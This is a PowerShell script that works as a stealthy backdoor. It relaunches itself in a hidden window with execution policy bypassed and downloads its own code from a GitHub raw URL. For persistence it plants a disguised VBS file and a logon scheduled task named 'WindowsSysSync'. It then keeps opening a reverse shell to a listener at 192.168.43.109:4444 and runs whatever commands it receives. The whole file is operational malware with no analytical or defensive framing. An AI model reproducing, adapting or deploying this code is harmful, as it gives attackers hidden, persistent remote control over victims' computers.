# --- 1. INSTANT HIDDEN FORK ---
# This block detects if a window is visible. If it is, it spawns a 
# hidden twin and kills the visible one in less than 0.5 seconds.
if ($Host.UI.RawUI.WindowSize.Height -gt 0) {
    $Code = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/thegostman/happy/refs/heads/main/happy.ps1')
    Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoP -W Hidden -Exec Bypass -Command `"$Code`""
    exit
}

# --- 2. CONFIGURATION ---
$Url = "https://raw.githubusercontent.com/thegostman/happy/refs/heads/main/happy.ps1"
$LHOST = "192.168.43.109"
$LPORT = 4444

# --- 3. RESTART PERSISTENCE ---
$VBSPath = "$env:APPDATA\win_sys_helper.vbs"
$VBSCode = "Set W=CreateObject('WScript.Shell'):W.Run 'powershell -NoP -W Hidden -E Bypass -C IEX(New-Object Net.WebClient).DownloadString(''$Url'')',0,False"
Set-Content -Path $VBSPath -Value $VBSCode -Force

if (!(Get-ScheduledTask -TaskName "WindowsSysSync" -ErrorAction SilentlyContinue)) {
    $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$VBSPath`""
    $Trigger = New-ScheduledTaskTrigger -AtLogOn
    Register-ScheduledTask -TaskName "WindowsSysSync" -Action $Action -Trigger $Trigger -Force
}

# --- 4. BEACON LOOP (Wait for Network) ---
while($true) {
    try {
        # Check if we can reach the internet/Kali before trying the socket
        if (Test-Connection -ComputerName 8.8.8.8 -Count 1 -Quiet) {
            $client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
            $stream = $client.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream); $writer.AutoFlush = $true
            $writer.WriteLine("--- GHOST CONNECTED ---")
            $reader = New-Object System.IO.StreamReader($stream)
            
            while($client.Connected) {
                $writer.Write("PS " + (Get-Location).Path + "> ")
                $line = $reader.ReadLine()
                if ($null -eq $line -or $line -eq "exit") { break }
                $out = (Invoke-Expression $line 2>&1 | Out-String)
                $writer.WriteLine($out)
            }
            $client.Close()
        }
    }
    catch {
        # Stay silent and wait 10 seconds to try again
        Start-Sleep -Seconds 10
    }
}
